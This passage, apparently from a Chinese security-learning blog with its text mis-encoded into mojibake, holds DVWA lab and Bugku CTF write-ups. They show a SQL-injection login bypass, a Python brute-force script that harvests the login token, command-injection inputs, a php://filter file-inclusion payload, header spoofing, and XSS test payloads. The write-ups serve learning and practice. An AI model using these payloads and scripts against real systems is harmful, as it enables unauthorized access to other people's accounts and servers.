    <content type="text"><![CDATA[ä¸€ã€ ç¬¬ä¸€é¢˜å…ˆä»éš¾åº¦æ˜¯lowçš„å¼€å§‹ã€‚æˆ‘ä»¬å°è¯•äº†ä¸‹adminâ€™# ç›´æ¥æŠŠå¯†ç æ³¨é‡Šæ‰ï¼ŒæˆåŠŸç ´è§£ã€‚æˆ‘ä»¬å°è¯•ä¸‹mediumç­‰çº§è¿˜æ˜¯å°è¯•äº†ä¸‹adminâ€™#ï¼Œå‘ç°å¯†ç é”™è¯¯ï¼Œçœ‹æ¥è¿™ä¸ªæ¼æ´è¢«é˜²æŠ¤äº† é¦–å…ˆæˆ‘ä»¬æŠ“åŒ…çœ‹ä¸‹httpè¯·æ±‚å¤´çš„ä¿¡æ¯ï¼Œå‘ç°å¯ä»¥åœ¨httpå¤´éƒ¨çœ‹åˆ°çœ‹åˆ°æˆ‘ä»¬æäº¤çš„è´¦å·å¯†ç ï¼Œæ—¢ç„¶è¿™æ ·æˆ‘ä»¬ä½¿ç”¨owasp zap è½¯ä»¶æš´åŠ›ç ´è§£ã€‚è¿™æ˜¯æˆ‘ä½¿ç”¨çš„å­—å…¸ï¼Œå¤§å®¶å¯ä»¥å»ç™¾åº¦æœç´¢æ›´å¤šçš„å­—å…¸æš´åŠ›æˆåŠŸç ´è§£å‡ºè´¦å·å¯†ç ã€‚ä¸‹é¢æˆ‘ä»¬å°è¯•highç­‰çº§ï¼Œå‘æŠ“åŒ…å‘ç°å¤šäº†ä¸ªuser_token(å®ƒçš„èŒè´£æ˜¯ä¿æŠ¤ç”¨æˆ·çš„ç”¨æˆ·ååŠå¯†ç å¤šæ¬¡æäº¤ï¼Œä»¥é˜²å¯†ç æ³„éœ²ã€‚)ä¸”æ¯ä¸€æ¬¡çš„user_takeä¼šè¢«è®°å½•åˆ°ä¸‹ä¸€æ¬¡è¯·æ±‚å¤´é‡Œçš„referreré‡Œã€‚è¿™æ ·ä¸Šé¢çš„æ–¹æ³•æˆ‘ä»¬å°±ä¸èƒ½ä½¿ç”¨äº†ã€‚ä½†æ˜¯è®¤çœŸè§‚å¯Ÿï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ç¬¬ä¸€æ¬¡è¿›ç™»å½•é¡µé¢æ˜¯æ²¡æœ‰user_tokenï¼Œè¿™å°±æ˜¯çªç ´å£ã€‚é‚£ä¹ˆå°±å¯ä»¥ä¸€ç›´åœ¨ç™»å½•ç•Œé¢å’Œç¬¬ä¸€æ¬¡ç™»å½•è¿›è¡Œç ´è§£ã€‚è¿˜æœ‰ä¸€ç§æ€è·¯æ˜¯è™½ç„¶åŠ äº†user_token,ä½†æ˜¯å¹¶æ²¡æœ‰å¯¹å°è¯•çš„æ¬¡æ•°è¿›è¡Œé™åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆè·å–user_tokenï¼Œç„¶åç”¨user_tokenåŠ ä¸Šç”¨æˆ·å¯†ç éªŒè¯èº«ä»½ã€‚æˆ‘ä»¬ä½¿ç”¨pythonè„šæœ¬è‡ªåŠ¨åŒ–çˆ†åŠ›ç ´è§£(ç¬¬äºŒç§æ€è·¯)ã€‚ from bs4 import BeautifulSoup import requests header={ &apos;GET&apos;: &apos;http://localhost/DVWA/vulnerabilities/brute/ HTTP/1.1&apos;, &apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0&apos;, &apos;Accept&apos;:&apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&apos;, &apos;Accept-Language&apos;:&apos;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&apos;, &apos;Referer&apos;:&apos;http://localhost/DVWA/vulnerabilities/brute/&apos;, &apos;cookie&apos;:&apos;PHPSESSID=8fbhto539r4fnjt4dduolvikj3; security=high&apos;, &apos;Connection&apos;:&apos;keep-alive&apos;, &apos;Upgrade-Insecure-Requests&apos;:&apos;1&apos;, &apos;Host&apos;:&apos;127.0.0.1&apos; } requrl=&quot;http://127.0.0.1/DVWA/vulnerabilities/brute/&quot; def get_token(requrl,header): response=requests.get(url=requrl,headers=header) print (response.status_code,len(response.content)) soup=BeautifulSoup(response.text,&quot;html.parser&quot;) input=soup.form.select(&quot;input[type=&apos;hidden&apos;]&quot;) #è¿”å›çš„æ˜¯ä¸€ä¸ªliståˆ—è¡¨ user_token=input[0][&apos;value&apos;] #è·å–ç”¨æˆ·çš„token return user_token user_token=get_token(requrl,header) i=0 for line in open(&quot;password.txt&quot;): requrl=&quot;http://127.0.0.1/DVWA/vulnerabilities/brute/?username=admin&amp;password=&quot;+line.strip()+&quot;&amp;Login=Login&amp;user_token=&quot;+user_token i=i+1 print (i , &apos;admin&apos; ,line.strip(),end=&quot; &quot;) user_token=get_token(requrl,header) # å°è¯•æ¬¡æ•° if(i==20): break ) æˆ‘ä»¬ç»§ç»­æŸ¥çœ‹imposeç­‰çº§ï¼Œå‘ç°è¾“é”™3æ¬¡å°±è¢«é™åˆ¶15åˆ†é’Ÿæ— æ³•ç™»å…¥ã€‚é‚£ä¹ˆè¿˜æœ‰ä»€ä¹ˆæ˜¯å¯ä»¥é˜²æ­¢æš´åŠ›ç ´è§£çš„å‘¢ï¼Ÿè¿˜æœ‰éªŒè¯ç ã€‚]]></content>
      <categories>
        <category>DVWA</category>
      </categories>
      <tags>
        <tag>æ¼æ´</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[command injection]]></title>
    <url>%2F2019%2F03%2F09%2Fcommand-injection%2F</url>
    <content type="text"><![CDATA[ä¸€ã€ä»€ä¹ˆæ˜¯å‘½ä»¤æ³¨å…¥1ã€æ¦‚å¿µé€šè¿‡webåº”ç”¨ç¨‹åºåœ¨æœåŠ¡å™¨ä¸Šæ‹¼æ¥ç³»ç»Ÿå‘½ä»¤ã€‚ç®€å•è¯´å°±æ˜¯æ³¨å…¥çš„å‘½ä»¤æ˜¯ç³»ç»Ÿå‘½ä»¤ï¼Œè€Œæ³¨å…¥æ˜¯é è¿æ¥æ¥å®Œæˆçš„ã€‚å¸¸è§çš„windowså‘½ä»¤ï¼šipconfigï¼ŒæŸ¥çœ‹æœ¬åœ°ç½‘ç»œnet user,æŸ¥çœ‹ç³»ç»Ÿç”¨æˆ· dir â€œ./ â€ æŸ¥çœ‹å½“å‰ç›®å½• ç­‰ç­‰å¸¸è§çš„å‘½ä»¤æ‹¼æ¥ç¬¦æœ‰&amp;&amp;, &amp; ,|, || äºŒã€å°è¯•lowç­‰çº§è¾“å…¥127.0.0.1å‘ç°è¾“å‡ºçš„å†…å®¹å°±æ˜¯åœ¨cmdæ‰§è¡Œpingå‘½ä»¤çš„ç»“æœï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒè°ƒç”¨äº†ç³»ç»Ÿå‘½ä»¤ï¼Œäºæ˜¯æˆ‘ä»¬å°è¯•ä¸‹è¾“å…¥127.0.0.1 &amp; net useræ³¨å…¥æˆåŠŸ ä¸‰ã€å°è¯•mediumç­‰çº§ å››ã€å°è¯•ä¸‹highç­‰çº§å‘ç°æ³¨å…¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬é‡‡ç”¨ | è¿æ¥ï¼Œå‘ç°æ³¨å…¥æˆåŠŸæˆ‘ä»¬æŸ¥çœ‹æºç ï¼Œå‘ç°äº†åŸå›  äº”ã€å°è¯•ä¸‹imposeç­‰çº§å‘ç°å®ƒç°åœ¨äº†æˆ‘ä»¬çš„IPæ ¼å¼ï¼Œè¿™å°±æ˜¯æ‰€è°“çš„ç™½åå•ï¼Œå¯ä»¥æœ‰æ•ˆçš„é˜²æ­¢å‘½ä»¤æ³¨å…¥ã€‚ä¸æ¨èé»‘åå•ï¼Œåº”è¯¥å¯ä»¥é€šè¿‡åŒå¼•å·ï¼Œç•¥è¿‡é»‘åå•ã€‚linuxä¸‹è¿˜æ”¯æŒå•å¼•å· å¦‚æœä¸è¾“å‡ºæ˜¾ç¤ºç»“æœæ€ä¹ˆåŠ]]></content>
      <categories>
        <category>DVWA</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bugku 12-16 write up(web)]]></title>
    <url>%2F2019%2F03%2F09%2Fbugku-12-16%2F</url>
    <content type="text"><![CDATA[ä¸€ã€ç¬¬12é¢˜ï¼ˆå¤´ç­‰èˆ±ï¼‰å…ˆå°è¯•ç«ç‹æµè§ˆå™¨çš„å¼€å‘è€…å·¥å…·ï¼Œå‘ç°å“åº”å¤´ä¸º136å­—èŠ‚ï¼Œå¯æ˜¯å‚æ•°ç¡®è¯´æœ‰139å­—èŠ‚ï¼Œéšè—äº†3ä¸ªå­—èŠ‚é‚£ä¹ˆæˆ‘ä»¬ä½¿ç”¨burp suit æŠ“åŒ…ï¼Œç„¶åä½¿ç”¨repeateråŠŸèƒ½ï¼Œgoä¸€ä¸‹å‘ç°flagï¼ˆflagå³ä¸ºéšè—çš„å­—èŠ‚ï¼‰ äºŒã€ç¬¬13é¢˜ï¼ˆç½‘ç«™è¢«é»‘ï¼‰é¦–å…ˆï¼Œæ ¹æ®åŸŸåå’Œç½‘é¡µæç¤ºï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ç½‘ç«™åå°ã€‚æˆ‘ä»¬ä½¿ç”¨å¾¡å‰‘å·¥å…·ç›´æ¥æ‰«é™¤åå°æˆåŠŸæ‰«å‡ºç½‘ç«™åå°è¿›å…¥ç½‘ç«™åå°ï¼Œå°è¯•äº†ä¸€äº›admin,passwordå¸¸ç”¨çš„å¯†ç ä¹‹åï¼Œå‘ç°ç™»å…¥ä¸äº†ã€‚æˆ‘ä»¬ä½¿ç”¨burp suite,çˆ†ç ´åŠŸèƒ½è¿›è¡Œçˆ†ç ´æ‰«å‡ºå¯†ç ä¸ºhack,è¾“å…¥å¯†ç å³å¯å¾—åˆ°flag ä¸‰ã€ç¬¬14é¢˜ï¼ˆç®¡ç†å‘˜ç³»ç»Ÿï¼‰ä½¿ç”¨ç«ç‹æµè§ˆå™¨å¼€å‘è€…å·¥å…·æŸ¥çœ‹æºç å‘ç°æœ‰æ®µåŠ å¯†çš„base64ä»£ç è§£å¯†åä¸ºtest123ï¼Œé¢˜ç›®åˆæç¤ºï¼ŒIPç¦æ­¢è®¿é—®ï¼Œè¯·è”ç³»æœ¬åœ°ç®¡ç†å‘˜ç™»é™†ï¼ŒIPå·²è¢«è®°å½•.ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±ç»™headeræ·»åŠ ä¸ªX-Forwarded-For: 127.0.0.1å‚æ•°ã€‚ å››ã€ç¬¬15é¢˜ï¼ˆweb4ï¼‰è§‚å¯Ÿæºç å‘ç°ï¼Œæœ‰ä¸€å †utf-8åŠ å¯†çš„å­—ç¬¦ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿›è¡Œutf-8è§£å¯†è¿™ä¸ªæ˜¯è§£å¯†åçš„ç»“æœè§‚å¯Ÿevalå‡½æ•°è¯­å¥å¯çŸ¥ï¼Œæˆ‘ä»¬åº”è¯¥è¾“å…¥ï¼Œp1+54aa2+p2çš„å€¼,è¾“å…¥æœç„¶å¾—å‡ºflag äº”ã€ç¬¬åå…­é¢˜ï¼ˆflagåœ¨indexé‡Œï¼‰ç‚¹å‡»è¿›å»ã€‚å‘ç°è¿™æ˜¯ä¸ªæ–‡ä»¶åŒ…å«æ¼æ´é‚£ä¹ˆæˆ‘ä»¬é‡‡ç”¨PHPä¼ªåè®®ï¼Œè¾“å…¥http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.phpä¼šå‘ç°å‡ºç°äº†base64ä»£ç ã€‚è¿›è¡Œè§£ç å¾—åˆ°index.phpçš„æºç ï¼Œå‘ç°flagè¢«æ³¨é‡Šæ‰è¿™å°±æ˜¯æˆ‘ä»¬ä¸ºä»€ä¹ˆè¦ä½¿ç”¨base64ç¼–ç è¾“å‡ºçš„åŸå› ã€‚ &lt;html&gt; &lt;title&gt;Bugku-ctf&lt;/title&gt; &lt;?php error_reporting(0); if(!$_GET[file]){echo &apos;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&apos;;} $file=$_GET[&apos;file&apos;]; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;)){ echo &quot;Oh no!&quot;; exit(); } include($file); //flag:flag{edulcni_elif_lacol_si_siht} ?&gt; &lt;/html&gt; php://filter/æ˜¯ä¸€ç§è®¿é—®æœ¬åœ°æ–‡ä»¶çš„åè®®ï¼Œ/read=convert.base64-encode/è¡¨ç¤ºè¯»å–çš„æ–¹å¼æ˜¯base64ç¼–ç åï¼Œresource=index.phpè¡¨ç¤ºç›®æ ‡æ–‡ä»¶ä¸ºindex.phpã€‚ é€šè¿‡ä¼ é€’è¿™ä¸ªå‚æ•°å¯ä»¥å¾—åˆ°index.phpçš„æºç ï¼Œä¸‹é¢è¯´è¯´ä¸ºä»€ä¹ˆï¼Œçœ‹åˆ°æºç ä¸­çš„includeå‡½æ•°ï¼Œè¿™ä¸ªè¡¨ç¤ºä»å¤–éƒ¨å¼•å…¥phpæ–‡ä»¶å¹¶æ‰§è¡Œï¼Œå¦‚æœæ‰§è¡Œä¸æˆåŠŸï¼Œå°±è¿”å›æ–‡ä»¶çš„æºç ã€‚ è€Œincludeçš„å†…å®¹æ˜¯ç”±ç”¨æˆ·æ§åˆ¶çš„ï¼Œæ‰€ä»¥é€šè¿‡æˆ‘ä»¬ä¼ é€’çš„fileå‚æ•°ï¼Œæ˜¯includeï¼ˆï¼‰å‡½æ•°å¼•å…¥äº†index.phpçš„base64ç¼–ç æ ¼å¼ï¼Œå› ä¸ºæ˜¯base64ç¼–ç æ ¼å¼ï¼Œæ‰€ä»¥æ‰§è¡Œä¸æˆåŠŸï¼Œè¿”å›æºç  æœ¬é¢˜å‚è€ƒè¿™ç¯‡åšå®¢è§£ç­”ï¼šhttps://blog.csdn.net/zpy1998zpy/article/details/80585443]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bugku 1~11é¢˜ write upï¼ˆwebï¼‰]]></title>
    <url>%2F2019%2F03%2F06%2Fbugku-1-11%2F</url>
    <content type="text"><![CDATA[ä¸€ã€ç¬¬ä¸€é¢˜ï¼ˆweb2ï¼‰æŸ¥çœ‹æºä»£ç ï¼ŒæŸ¥æ‰¾flag,å³å¯å¾—å‡ºflagã€‚ äºŒã€ç¬¬äºŒé¢˜ï¼ˆè®¡ç®—å™¨ï¼‰è¾“å…¥163ï¼Œå‘ç°åªèƒ½è¾“å…¥ä¸€ä½æ•°ã€‚ä½æ•°è¢«é™åˆ¶äº†ã€‚æˆ‘ä»¬ä½¿ç”¨ç«ç‹æµè§ˆå™¨çš„å¼€å‘è€…å·¥å…·ï¼ˆF12ï¼‰è°ƒå‡ºæ¥ã€‚å®šä½åˆ°è¾“å…¥æ¡†çš„ä½ç½®ã€‚å‘ç°æœ€å¤§ä½æ•°è¢«é™åˆ¶äº†ï¼ŒæŠŠ1æ”¹æˆ3å³å¯å¾—å‡ºflagã€‚ ä¸‰ã€ç¬¬ä¸‰é¢˜(webåŸºç¡€$_GET)æ‰“å¼€é¢˜ç›®å‘ç°æ˜¯PHPä»£ç ï¼Œé˜…è¯»ä»£ç å¯çŸ¥ï¼Œæˆ‘ä»¬åœ¨URLä¸­ä¼ å…¥å‚æ•°?what=flagå³å¯å¾—å‡ºflag å››ã€ç¬¬å››é¢˜(webåŸºç¡€$_POST)æ‰“å¼€é¢˜ç›®å‘ç°æ˜¯PHPä»£ç ï¼Œé˜…è¯»ä»£ç å¯çŸ¥ï¼Œéœ€è¦ä½¿ç”¨POSTæ–¹å¼ä¼ å€¼ã€‚ä½¿ç”¨ç«ç‹æµè§ˆå™¨çš„hackbaræ’ä»¶ï¼Œå¦‚å›¾ äº”ã€ç¬¬äº”é¢˜ï¼ˆçŸ›ç›¾ï¼‰å…ˆä»‹ç»ä¸‹is_numeric()å‡½æ•°ï¼šis_numeric() å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ã€‚PHP ç‰ˆæœ¬è¦æ±‚ï¼šPHP 4, PHP 5, PHP 7å¦‚æœæŒ‡å®šçš„å˜é‡æ˜¯æ•°å­—å’Œæ•°å­—å­—ç¬¦ä¸²åˆ™è¿”å› TRUEï¼Œå¦åˆ™è¿”å› FALSEã€‚ åˆ†æä»£ç ï¼Œå¯çŸ¥ï¼Œnumå¿…é¡»==1ï¼Œä½†æ˜¯åˆä¸èƒ½æ˜¯æ•°å­—æˆ–è€…æ˜¯æ•°å­—å­—ç¬¦ä¸²ã€‚ ==åˆè¡¨ç¤ºåªè¦å€¼ç›¸ç­‰å°±å¯ä»¥äº†ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åœ¨è¾“å…¥num=1XXXï¼Œxxxè¡¨ç¤ºéæ•°å­—ã€‚ å…­ã€ç¬¬å…­é¢˜ï¼ˆweb3ï¼‰1ã€è¿›å…¥é¢˜ç›®å‘ç°ä¸€ç›´åœ¨å¼¹çª—ï¼Œç‚¹äº†å‡ éç¡®å®šåæ„Ÿè§‰è¢«è€äº†ã€‚2ã€é˜»æ­¢å¼¹çª—æŸ¥çœ‹æºç ã€‚å‘ç°flagåœ¨æœ€åä¸€è¡Œçš„alertæ ‡ç­¾é‡Œã€‚ä¸”è¢«æ³¨é‡Šæ‰3ã€å‘ç°flagæ˜¯&amp;#xç±»å‹çš„ï¼Œè¿™æ˜¯unicodeç¼–ç ã€‚ä¸çŸ¥é“ä¹Ÿæ²¡äº‹ï¼Œç™¾åº¦ä¸‹å°±å¯ä»¥çŸ¥é“4ã€ç™¾åº¦æœç´¢unicodeåœ¨çº¿è§£ç ï¼Œå°±å¯ä»¥å¾—å‡ºflagã€‚ ä¸ƒã€ç¬¬ä¸ƒé¢˜ï¼ˆåŸŸåè§£æï¼‰çœ‹åˆ°é¢˜ç›®åŸŸåè§£ææˆ‘ä»¬å°±è¦æƒ³åˆ°hostsæ–‡ä»¶ã€‚æˆ‘ä»¬æ‰“å¼€hostsæ–‡ä»¶hostsæ–‡ä»¶ä½ç½®C:\Windows\System32\drivers\etcåœ¨æ–‡ä»¶æœ«å°¾åŠ å…¥123.206.87.240 flag.baidu.comåœ¨æµè§ˆå™¨ä¸­è¾“å…¥flag.baidu.comæˆ–è€…123.206.87.240 å³å¯å¾—å‡ºflag å…«ã€ç¬¬å…«é¢˜ï¼ˆå¿…é¡»è®©ä»–åœä¸‹æ¥ï¼‰æ‰“å¼€é¢˜ç›®å‘ç°ä¸€ç›´åœ¨åˆ·æ–°ï¼Œè§‚å¯Ÿæºç ï¼Œå‘ç°flagåº”è¯¥åœ¨å›¾ç‰‡åˆ·å‡ºæ¥çš„æ—¶å€™å‡ºç°ã€‚æˆ‘ä»¬ä½¿ç”¨burp suitè¿›è¡ŒæŠ“åŒ…æ”¾åŒ…ï¼Œç»è¿‡äº†jå‡ æ¬¡ï¼ˆGOï¼‰æ“ä½œä¹‹åï¼Œæˆ‘ä»¬å‘ç°äº†flag. ä¹ã€ç¬¬ä¹é¢˜æœ¬åœ°åŒ…å«è§‚å¯Ÿä»£ç å‘ç°flag.phpè¢«éšè—èµ·æ¥äº†ã€‚å°è¯•ä¸‹ä¼ å…¥å‚æ•°?hello=hello,å‘ç°helloåœ¨ä¸‹é¢ä»£ç ä¸­ä½“ç°è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥ä¼ å…¥å‚æ•°è¾“å‡ºflag.phpæ–‡ä»¶çš„å†…å®¹ï¼Œå‘ç°flagã€‚ä¼ å…¥çš„å‚æ•°æ˜¯?hello=file(â€œflag.phpâ€) åã€ç¬¬åé¢˜ï¼ˆå˜é‡1ï¼‰è§‚å¯Ÿæºç å‘ç°ä»£ç æœ€åä¸€è¡Œæœ‰ä¸ªå¯å˜å˜é‡ã€‚æˆ‘ä»¬è®©args=GLOBALS å…¨å±€æ•°ç»„å˜é‡ å› ä¸º$args=GLOBALS åˆvar_dump($$args) ï¼Œæ‰€ä»¥å’Œå‰é¢é‚£ä¸ª$ ï¼Œç»„æˆ$GLOBALS flagå˜é‡åˆåœ¨$GLOBALSä¸­ï¼Œvar_dump eval æˆåŠŸå¾—åˆ°flag $GLOBALSä»‹ç» $GLOBALS[&#39;var&#39;]æ˜¯å¤–éƒ¨çš„å…¨å±€å˜é‡æœ¬èº«,åœ¨å‡½æ•°å†…éƒ¨å¯ä»¥ä½¿ç”¨$GLOBALSæ•°ç»„è°ƒç”¨2.ä½œç”¨åŸŸï¼šGlobalçš„ä½œç”¨æ˜¯å®šä¹‰å…¨å±€å˜é‡,ä½†æ˜¯è¿™ä¸ªå…¨å±€å˜é‡ä¸æ˜¯åº”ç”¨äºæ•´ä¸ªç½‘ç«™,è€Œæ˜¯åº”ç”¨äºå½“å‰é¡µé¢,åŒ…æ‹¬includeæˆ–requireçš„æ‰€æœ‰æ–‡ä»¶ã€‚ $GLOBALSè¶…å…¨å±€æ•°ç»„é€‚ç”¨äºä»»ä½•åœ°æ–¹ åä¸€ã€ç¬¬åä¸€é¢˜ï¼ˆweb5ï¼‰é¦–å…ˆä»‹ç»ä¸‹JSPFUCkJSFuckï¼ˆæˆ–ä¸ºäº†é¿è®³è„è¯å†™ä½œ JSF*ck ï¼‰æ˜¯ä¸€ç§æ·±å¥¥çš„ JavaScriptç¼–ç¨‹é£æ ¼ã€‚ä»¥è¿™ç§é£æ ¼å†™æˆçš„ä»£ç ä¸­ä»…ä½¿ç”¨ [ã€]ã€(ã€)ã€! å’Œ + å…­ç§å­—ç¬¦ã€‚æ­¤ç¼–ç¨‹é£æ ¼çš„åå­—æ´¾ç”Ÿè‡ªä»…ä½¿ç”¨è¾ƒå°‘ç¬¦å·å†™ä»£ç çš„Brainfuckè¯­è¨€ã€‚ä¸å…¶ä»–æ·±å¥¥çš„ç¼–ç¨‹è¯­è¨€ä¸åŒï¼Œä»¥JSFucké£æ ¼å†™å‡ºçš„ä»£ç ä¸éœ€è¦å¦å¤–çš„ç¼–è¯‘å™¨æˆ–è§£é‡Šå™¨æ¥æ‰§è¡Œï¼Œæ— è®ºæµè§ˆå™¨æˆ–JavaScriptå¼•æ“ä¸­çš„åŸç”Ÿ JavaScript è§£é‡Šå™¨çš†å¯ç›´æ¥è¿è¡Œã€‚é‰´äº JavaScript æ˜¯å¼±ç±»å‹è¯­è¨€ï¼Œç¼–å†™è€…å¯ä»¥ç”¨æ•°é‡æœ‰é™çš„å­—ç¬¦é‡å†™ JavaScript ä¸­çš„æ‰€æœ‰åŠŸèƒ½ï¼Œä¸”å¯ä»¥ç”¨è¿™ç§æ–¹å¼æ‰§è¡Œä»»ä½•ç±»å‹çš„è¡¨è¾¾å¼ã€‚ç®€å•åœ°è¯´ï¼Œå°±æ˜¯æœ‰äººä¸æƒ³è®©è‡ªå·±çš„ä»£ç è¢«åˆ«äººè®¤å‡ºæ¥ï¼Œç”¨6ç§å­—ç¬¦æ”¹é€ äº†è‡ªå·±çš„jsä»£ç  æˆ‘ä»¬æŸ¥çœ‹æºç å‘ç°æœ‰ä¸€å †çš„ [ã€]ã€(ã€)ã€! å’Œ + ï¼ŒæŠŠä»–ä»¬æ‰”è¿›æµè§ˆå™¨æ§åˆ¶å°ï¼ˆç«ç‹æµè§ˆå™¨æŒ‰F12æ‰“å¼€æ§åˆ¶å°ï¼‰è¿›è¡Œè°ƒè¯•ï¼Œå³å¯å¾—å‡ºflag,è®°å¾—è¦å¤§å†™ã€‚]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[XSSå’ŒCSRFä¹‹ä»‹ç»]]></title>
    <url>%2F2019%2F03%2F06%2Fxss1%2F</url>
    <content type="text"><![CDATA[ä¸€ã€ä»€ä¹ˆæ˜¯XSSå…¨ç§°ï¼šCross Site Scriptä¸­æ–‡åç§°ï¼šè·¨ç«™è„šæœ¬å±å®³ï¼šç›—å–ç”¨æˆ·ä¿¡æ¯ã€é’“é±¼ã€åˆ¶é€ è •è™«ç­‰ æ¦‚å¿µï¼š äºŒã€xssçš„åˆ†ç±»1ã€å­˜å‚¨å‹è®¿é—®ç½‘ç«™æ—¶ï¼Œè§¦å‘XSSæˆ‘ä»¬å¯ä»¥é€šè¿‡æŸ¥çœ‹ç½‘é¡µæºä»£ç çš„æ–¹å¼æŸ¥çœ‹xssçš„è§¦å‘ç‚¹ã€‚ æˆ‘ä»¬å®‰è£…irebugï¼ˆF12å¿«æ·ä»¶æ‰“å¼€ï¼‰ï¼Œåˆ©ç”¨è¯¥ç«ç‹æ’ä»¶æ¥å¯»æ‰¾æ³¨å…¥ç‚¹ã€‚ åˆ†æå…¶æ”»å‡»è¿‡ç¨‹ä½†æ˜¯xssè„šæœ¬æ˜¯æ€æ ·è¢«é»‘å®¢å†™å…¥æ•°æ®åº“å‘¢2ã€åå°„å‹è®¿é—®æºå¸¦xssè„šæœ¬çš„è¿æ¥æ—¶è§¦å‘xss æŸ¥çœ‹æºç ï¼Œå¯»æ‰¾è§¦å‘ç‚¹ å¦‚ä½•äº§ç”Ÿçš„å‘¢ï¼ˆå³è¾¹ä¸ºxssæºç ï¼‰åˆ†ææ”»å‡»è¿‡ç¨‹ å­˜å‚¨å‹xsså’Œåå°„å‹xssçš„åŒºåˆ«å­˜å‚¨å‹xssæ˜¯ä»æ•°æ®åº“ä¸­æå–xssçš„è„šæœ¬å†…å®¹åå°„å‹xssæ˜¯ç›´æ¥ä»urlçš„å†…å®¹ä¸­æå–å‡ºxssçš„è„šæœ¬çš„å†…å®¹ 3ã€DOMå‹é‚£ä»€ä¹ˆæ˜¯DOMå‘¢ï¼Œå°±æ˜¯Document Object Model,å³æ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼Œå®ƒå…è®¸è„šæœ¬ï¼ˆjsï¼‰æ§åˆ¶webçš„é¡µé¢ã€çª—å£å’Œæ–‡æ¡£ã€‚ç®€å•è¯´DOMå°±æ˜¯å°±æ˜¯jsæ“ä½œhtmlæ—¶çš„API(åº”ç”¨ç¨‹åºæ¥å£) è®¿é—®æºå¸¦xssè„šæœ¬çš„è¿æ¥æ—¶è§¦å‘xss æŸ¥çœ‹æºç ï¼Œäº†è§£è§¦å‘ç‚¹ åˆ†æåŸç† DOMå‹xssä¸åå°„å‹xsså¾ˆç±»ä¼¼ï¼Œä½†æ˜¯ä»–ä»¬æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢DOMå‹xssæ˜¯é€šè¿‡å‰ç«¯javascriptå°†xssè„šæœ¬å†™å…¥DOMä¸­ï¼Œè§¦å‘xss åå°„å‹xssæ˜¯é€šè¿‡åç«¯æˆ–åº”ç”¨ç¨‹åºå°†xssè„šæœ¬å†™å…¥å“åº”é¡µé¢ä¸­ï¼Œæµè§ˆå™¨å“åº”é¡µé¢æ—¶æ‰è§¦å‘xss å­˜å‚¨å‹xssæ¼æ´æ¼”ç¤º xssä»£ç åº”è¯¥ä¸º&lt;img src=&quot;a&quot; onerror=alert(/hhhh/)&gt;ï¼Œç”¨ç®¡ç†å‘˜å‘˜ç™»å…¥åå°ï¼Œè¿›å…¥ç•™è¨€æ¿ä¼šè§¦å‘xss,å‡ºç°å¼¹çª—å†…å®¹ä¸º/xxxx/ åå°„å‹xssæ¼æ´æ¼”ç¤ºæˆ‘ä»¬å†™ä¸€ä¸ªè¿™æ ·çš„è„šæœ¬æ–‡ä»¶ï¼Œå‘½åä¸ºindex.php &lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); if(isset($_REQUEST[&quot;name&quot;])) { $name=$_REQUEST[&quot;name&quot;]; } else{ $name = &quot;&quot;; } echo &quot;hhhhh &quot;.$name; ?&gt; æœ¬åœ°è®¿é—®ä¸‹ä¼ å…¥å‚æ•°ï¼Ÿname=&lt;img src=&quot;a&quot; onerror=alert(/hhhh/)&gt;alertï¼ˆï¼‰æ–¹æ³•ç”¨äºæ˜¾ç¤ºä¸€æ¡æŒ‡å®šçš„æ¶ˆæ¯å’Œä¸€ä¸ªokæŒ‰é’®çš„è­¦å‘Šæ¡†ç”¨qqæµè§ˆå™¨å°è¯•ä¸‹ï¼Œxssæ³¨å…¥è¢«æµè§ˆå™¨æ‹¦æˆªäº†ï¼Œå°´å°¬äº† ç”¨ç«ç‹æµè§ˆå™¨å†æ¬¡å°è¯•ï¼ŒæˆåŠŸæ³¨å…¥xssæŸ¥çœ‹æºç å³å¯å‘ç°æ³¨å…¥ä½ç½®DOMå‹xssæ¼æ´è¿™è¾¹å°±ä¸æ¼”ç¤ºäº† 4ã€å°ç»“ ä¸‰ã€CSRFæ˜¯ä»€ä¹ˆå…¨ç§°ï¼šCross-site request forgery ä¸­æ–‡åç§°æ˜¯ï¼šè·¨ç«™è¯·æ±‚ä¼ªé€  å±å®³ï¼šæ‰§è¡Œæ¶æ„æ“ä½œï¼ˆâ€è¢«è½¬è´¦â€œã€â€œè¢«å‘åƒåœ¾è¯„è®ºâ€ç­‰ï¼‰ã€åˆ¶é€ è •è™«Â·Â·Â·Â·Â·Â·Â· æ¦‚å¿µï¼šåˆ©ç”¨å®¢æˆ·å·²ç»ç™»å½•çš„èº«ä»½ï¼Œåœ¨ç”¨æˆ·æ¯«ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ï¼Œä»¥ç”¨æˆ·çš„åä¹‰å®Œæˆéæ³•æ“ä½œ 